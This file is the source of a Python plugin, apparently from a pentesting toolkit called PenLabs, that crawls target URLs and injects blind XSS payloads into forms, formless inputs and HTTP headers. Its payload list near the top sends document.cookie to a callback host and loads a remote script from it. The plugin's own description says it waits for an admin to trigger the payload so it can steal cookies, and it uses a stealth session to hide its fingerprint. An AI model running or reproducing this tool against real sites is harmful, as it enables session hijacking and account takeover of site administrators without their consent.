"""
PenLabs V1.0 — Blind XSS Injector Plugin
Chèn Blind XSS payloads vào form fields, headers, JSON bodies.
Sử dụng Interactsh OOB callback để xác nhận khi Admin trigger payload.
"""
import os
import re
import json
import logging
import requests
from urllib.parse import urlparse, urlencode
from core.base_plugin import BasePlugin
from core.evidence import attach_evidence, make_evidence

logger = logging.getLogger(__name__)

# Blind XSS payload templates — {CALLBACK} sẽ được thay bằng Interactsh URL
BLIND_XSS_PAYLOADS = [
    '"><img src=x onerror=fetch("{CALLBACK}/bxss?c="+document.cookie)>',
    "'><script src={CALLBACK}/bxss.js></script>",
    '"><svg/onload=fetch("{CALLBACK}/bxss?d="+document.domain)>',
    "javascript:fetch('{CALLBACK}/bxss?c='+document.cookie)//",
    '"><input onfocus=fetch("{CALLBACK}/bxss") autofocus>',
    '<img src="{CALLBACK}/bxss?r=img" style="display:none">',
]

# Form fields thường được Admin đọc (Blind XSS targets)
TARGET_FIELDS = [
    "name", "username", "first_name", "last_name", "fullname",
    "email", "subject", "message", "comment", "feedback",
    "description", "bio", "about", "address", "company",
    "title", "review", "content", "body", "text",
    "phone", "url", "website", "referrer", "user-agent",
]


class BlindXSSPlugin(BasePlugin):
    def name(self) -> str:
        return "BlindXSS"

    def description(self) -> str:
        return "Blind XSS Injector — Chèn payload OOB vào form/header/JSON, chờ Admin trigger để steal cookie/screenshot."

    def check_installed(self) -> bool:
        return True  # Built-in Python

    def run(self, urls: list, out_dir: str = "/tmp",
            headers: dict = None, interactsh_url: str = "",
            timeout: int = 10, max_urls: int = 30, 
            proxy_mode: str = "fuzz") -> dict:
        """
        Inject Blind XSS payloads vào tất cả form tìm thấy trên URLs.
        """
        os.makedirs(out_dir, exist_ok=True)
        
        callback = interactsh_url or "bxss-canary.pentools.internal"
        payloads = [p.replace("{CALLBACK}", f"http://{callback}") for p in BLIND_XSS_PAYLOADS]
        
        results = {
            "injected_count": 0,
            "forms_found": 0,
            "injections": [],
            "findings": [],
            "dast_findings": [],
            "header_injections": 0,
        }
        
        #  Use StealthNet session for unified fingerprinting
        from plugins.stealth_net_plugin import StealthNetPlugin
        stealth_net = StealthNetPlugin(scan_mode=proxy_mode)
        stealth_net.run()
        session = stealth_net._session

        if headers:
            session.headers.update(headers)

        TRACKING_DOMAINS = frozenset({
            'google-analytics.com', 'googletagmanager.com', 'googleadservices.com',
            'google.com', 'facebook.com', 'facebook.net', 'doubleclick.net',
            'yandex.ru', 'bing.com', 'clarity.ms', 'segment.io', 'mixpanel.com',
        })

        for url in urls[:max_urls]:
            try:
                parsed_url = urlparse(url)
                netloc_lower = parsed_url.netloc.lower().split(':')[0]
                if any(netloc_lower == td or netloc_lower.endswith('.' + td) for td in TRACKING_DOMAINS):
                    continue

                # Step 1: Fetch page and find forms
                resp = session.get(url, timeout=timeout)
                forms = self._extract_forms(resp.text, url)
                results["forms_found"] += len(forms)

                # Step 2: Submit each form with Blind XSS payloads
                for form in forms:
                    payload = payloads[results["injected_count"] % len(payloads)]
                    form_data = {}
                    
                    for field in form.get("fields", []):
                        field_name = field.get("name", "").lower()
                        field_type = field.get("type", "text").lower()
                        
                        if field_type in ["hidden", "csrf", "token"]:
                            form_data[field["name"]] = field.get("value", "")
                        elif field_type in ["email"]:
                            form_data[field["name"]] = f"test@{callback}"
                        elif field_name in TARGET_FIELDS or field_type in ["text", "textarea"]:
                            form_data[field["name"]] = payload
                        else:
                            form_data[field["name"]] = field.get("value", "test")
                    
                    if not form_data:
                        continue

                    try:
                        action_url = form.get("action", url)
                        method = form.get("method", "POST").upper()
                        
                        if method == "POST":
                            inject_resp = session.post(action_url, data=form_data, timeout=timeout)
                        else:
                            inject_resp = session.get(action_url, params=form_data, timeout=timeout)
                        
                        results["injected_count"] += 1
                        injection = {
                            "url": url,
                            "action": action_url,
                            "method": method,
                            "fields_injected": [k for k, v in form_data.items() if callback in str(v)],
                            "status_code": inject_resp.status_code,
                            "payload_type": "blind_xss",
                        }
                        results["injections"].append(injection)
                    except Exception as e:
                        logger.debug(f"[BlindXSS] Form submit failed: {e}")

                # Step 3: Header injection — inject XSS in common headers (Attempt mode: do not count as vuln without OOB callback)
                header_payload = payloads[0]
                xss_headers = {
                    "Referer": header_payload,
                    "X-Forwarded-For": header_payload,
                    "User-Agent": f"Mozilla/5.0 {header_payload}",
                }
                try:
                    header_resp = session.get(url, headers=xss_headers, timeout=timeout)
                    results["header_injections"] += 1
                    results["injections"].append({
                        "url": url,
                        "method": "GET",
                        "payload_type": "blind_xss_header_injection",
                        "headers_injected": list(xss_headers.keys()),
                        "status_code": header_resp.status_code,
                        "note": "Header injection sent; requires OOB callback for confirmation."
                    })
                except Exception:
                    pass

            except Exception as e:
                logger.debug(f"[BlindXSS] Error on {url}: {e}")
                continue

        # Save results
        out_file = os.path.join(out_dir, "blind_xss_results.json")
        with open(out_file, "w") as f:
            json.dump(results, f, indent=2, default=str)

        logger.info(f"[BlindXSS] Injected {results['injected_count']} payloads into {results['forms_found']} forms.")
        return results

    def _extract_forms(self, html: str, base_url: str) -> list:
        """Extract forms and input fields from HTML using BeautifulSoup4 with regex fallback."""
        forms = []
        parsed_base = urlparse(base_url)

        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, "html.parser")

            # 1. Standard HTML5 Forms
            for form in soup.find_all("form"):
                raw_action = form.get("action", "") or ""
                if raw_action.startswith("/"):
                    action = f"{parsed_base.scheme}://{parsed_base.netloc}{raw_action}"
                elif not raw_action.startswith("http"):
                    action = base_url
                else:
                    action = raw_action

                method = (form.get("method") or "POST").upper()

                fields = []
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name:
                        fields.append({
                            "name": name,
                            "type": (inp.get("type") or "text").lower(),
                            "value": inp.get("value") or "",
                        })

                if fields:
                    forms.append({
                        "action": action,
                        "method": method,
                        "fields": fields,
                    })

            # 2. SPA / Formless Inputs (inputs outside <form> tags)
            formless_fields = []
            for inp in soup.find_all(["input", "textarea"]):
                if not inp.find_parent("form") and inp.get("name"):
                    formless_fields.append({
                        "name": inp.get("name"),
                        "type": (inp.get("type") or "text").lower(),
                        "value": inp.get("value") or "",
                    })
            if formless_fields:
                forms.append({
                    "action": base_url,
                    "method": "POST",
                    "fields": formless_fields,
                })

            if forms:
                return forms

        except Exception as e:
            logger.debug(f"[BlindXSS] BS4 parse error: {e}, falling back to regex")

        # Fallback: Regex extraction
        form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        action_pattern = re.compile(r'action=["\']([^"\']*)["\']', re.IGNORECASE)
        method_pattern = re.compile(r'method=["\']([^"\']*)["\']', re.IGNORECASE)
        input_pattern = re.compile(r'<(?:input|textarea|select)[^>]*>', re.IGNORECASE)
        name_pattern = re.compile(r'name=["\']([^"\']*)["\']', re.IGNORECASE)
        type_pattern = re.compile(r'type=["\']([^"\']*)["\']', re.IGNORECASE)
        value_pattern = re.compile(r'value=["\']([^"\']*)["\']', re.IGNORECASE)

        for form_match in form_pattern.finditer(html):
            form_html = form_match.group(0)
            action = base_url
            action_m = action_pattern.search(form_html)
            if action_m:
                act_str = action_m.group(1)
                if act_str.startswith("/"):
                    action = f"{parsed_base.scheme}://{parsed_base.netloc}{act_str}"
                elif act_str.startswith("http"):
                    action = act_str

            method = "POST"
            method_m = method_pattern.search(form_html)
            if method_m:
                method = method_m.group(1).upper()

            fields = []
            for inp in input_pattern.finditer(form_html):
                inp_html = inp.group(0)
                name_m = name_pattern.search(inp_html)
                type_m = type_pattern.search(inp_html)
                value_m = value_pattern.search(inp_html)
                if name_m:
                    fields.append({
                        "name": name_m.group(1),
                        "type": type_m.group(1) if type_m else "text",
                        "value": value_m.group(1) if value_m else "",
                    })

            if fields:
                forms.append({"action": action, "method": method, "fields": fields})

        return forms
